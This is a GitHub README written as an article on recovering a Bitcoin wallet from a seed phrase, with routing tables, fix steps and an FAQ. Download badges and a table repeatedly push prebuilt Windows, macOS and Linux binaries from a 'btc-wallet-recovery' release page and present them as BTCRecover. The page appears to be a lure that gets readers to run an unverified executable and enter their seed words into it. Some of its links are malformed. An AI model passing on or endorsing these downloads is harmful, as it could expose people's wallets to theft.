<div align="center">
<img src="assets/banner-article.png" alt="How to recover a Bitcoin wallet with a seed phrase">
</div>

# How to recover a Bitcoin wallet with a seed phrase

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A seed phrase regenerates a wallet rather than unlocking a file, so a complete phrase restored into the right wallet type brings the keys back. When words are missing or out of order, the phrase has to be completed first: BTCRecover searches the unknown positions locally and checks each candidate against an address you already know belongs to the wallet.

## You'll see this if

Where you start depends on how much of the phrase survived and whether you know what made it. The table below is the whole routing decision  -  everything after it is one of these rows in detail.

| What you hold | What actually happens | Where to go |
|---|---|---|
| All 12 or 24 words, and you know the wallet | restore the phrase into that wallet; the keys come back | steps below |
| All the words, wallet unknown | the phrase is fine, the wallet type is the question | [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) |
| All the words, restore shows an empty wallet | wrong wallet type, derivation path or a passphrase | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |
| One to three words missing | a local search over the empty positions | [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) |
| All the words, but the order is uncertain | a local search over permutations | [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md) |
| The phrase plus one remembered address | the strongest position: candidates are checkable | [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md) |
| 13 or 16 words from an older wallet | a legacy format, not a standard phrase | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |

## Why it happens

A phrase is an input to a deterministic process. The words derive a master key, the master key derives a tree of accounts and addresses, and the first address the wallet shows is simply the first leaf that tree produces. Nothing about that involves a server, so nothing about it needs permission: the same words in the same wallet always produce the same addresses.

Two things routinely break the "same wallet" part. The first is wallet type: a phrase entered into a different application produces a different tree, so the balance looks absent even though the words are right. The second is the optional BIP39 passphrase, an extra word or string that quietly changes the master key  -  a wallet "protected" by one opens as an empty wallet without it.

This is also why recovery language is misleading. Nothing is being un-done. A restore is a regeneration, which is why a wrong order or a missing word produces either a refusal (checksum failure) or a valid but different wallet (a typo that happens to be a real word). Both are informative, and both are the reason a search is possible: each candidate is cheap to test and easy to check.

## Fix

Count and order the words before touching any software, then restore into a clean wallet of the correct type and check the first address against something you recorded.

1. **Lay the phrase out and number the positions.** Writing 1 to 12 or 1 to 24 on paper turns "I think the fourth word was..." into a usable input and exposes gaps immediately.
2. **Name the wallet that made it.** The application, the year, and whether it was desktop, mobile or a hardware device. If you cannot, identification comes before restoration.
3. **Install the current release of that wallet**, or run the current release of the recovery tool if the original application is gone  -  [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
4. **Restore into a clean install, never over an existing wallet.** A fresh profile keeps the recovered keys separate from anything you are already using.
5. **Compare the first receive address with your record.** This is the step people skip: an address that matches proves the restore worked, and one that does not is a useful failure rather than a mystery.
6. **If the address differs, test wallet type, then derivation, then the passphrase.** Those are the only three things that change the tree from a correct phrase: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
7. **If words are missing, stop restoring and start a local search.** A partial phrase cannot be restored by any wallet; it has to be completed against a target address first.

A complete phrase and a known wallet is a short job with no search involved. Everything expensive in this topic comes from the incomplete cases, and the difference between them is worth naming precisely before spending hours: words that exist but are in the wrong places behave nothing like words that were never written down.

## If that did not work

A restore that produces a valid but empty wallet is the most common outcome, and it is almost always a wallet-type or derivation mismatch rather than a lost cause. Test the three inputs in order, because each is cheap: the wallet application, the account or derivation option it offers, and whether a passphrase was ever set.

If the phrase is rejected outright, the words are the problem rather than the wallet  -  one word outside the list or a checksum failure means the sequence is not a valid phrase in that format. If the wallet is a type the tool does not target, no amount of searching changes that, and the honest route is the wallet's own restore flow. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) is where to go once the three inputs have been checked and the result still does not match.

## Prevention

- Restore the phrase into an empty wallet **before** it holds funds, and record the first address it produces.
- Store the wallet name, the year and the derivation option with the backup  -  the words alone lose that context.
- Keep two copies in separate places, on paper or metal, never as a photo or a cloud note.
- If a passphrase was used, record that it exists, even if not where it is written.
- Re-test one backup each year; a restore you have practised is worth more than a backup you have not.

BTCRecover is actively maintained; the current release, including anything that changes how a restore behaves, is published on the GitHub releases page.
## FAQ

### Can I recover my Bitcoin wallet with just the seed phrase?

Yes, when the phrase is complete and the wallet type is known: restoring it regenerates the keys and the addresses. With words missing it is not a restore but a search, and the target address becomes essential.

### Why does my phrase restore an empty wallet?

The tree the phrase produces depends on the wallet application, the derivation option and any BIP39 passphrase. A correct phrase read through the wrong combination gives a valid wallet with no history in it, which looks identical to a lost wallet until the address is compared.

### Does the order of the words matter?

Yes, completely. A phrase in the wrong order usually fails its checksum, and when it does not, it derives a different wallet. Order is one of the two things a local search can solve, along with missing words: [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md).

### Can I recover a wallet without the phrase?

Only if something else that produces the keys survives  -  an encrypted wallet file with a recoverable password, a hardware device, or an exported key. If the phrase is gone and no file remains, nothing on a disk can regenerate the wallet, and any offer to do it is a theft attempt.

### My wallet asks for 24 words but I have 12. Is that a problem?

Usually it means the wallet expects a different phrase length than the one you hold, not that words are missing. Check what the original wallet used before adding anything: a 12-word phrase belongs to a wallet that accepts 12 words, and forcing it into a 24-word field proves nothing.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
